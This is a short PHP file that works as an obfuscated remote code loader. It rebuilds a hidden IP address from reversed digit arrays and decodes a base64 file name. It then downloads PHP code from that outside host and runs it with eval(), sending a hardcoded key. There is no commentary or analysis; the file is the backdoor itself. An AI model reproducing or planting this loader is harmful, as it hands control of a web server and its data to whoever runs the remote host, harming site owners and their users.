<?php
$key = '972c97bdc47dfc8ds2aa0j0a3ef0e74c55da0bbfd';
$ipar = [[6,5,1],[6,6],[1,7],[7,6,1]];
$ip = '';

foreach(array_reverse($ipar) as $ar){
  foreach(array_reverse($ar) as $ar2){
    $ip .= $ar2;
  }
  $ip .= '.';
}
eval(file_get_contents('http://'.substr($ip, 0, -1).'/'.base64_decode('ZmlsZS5waHA=').'?file='.$key));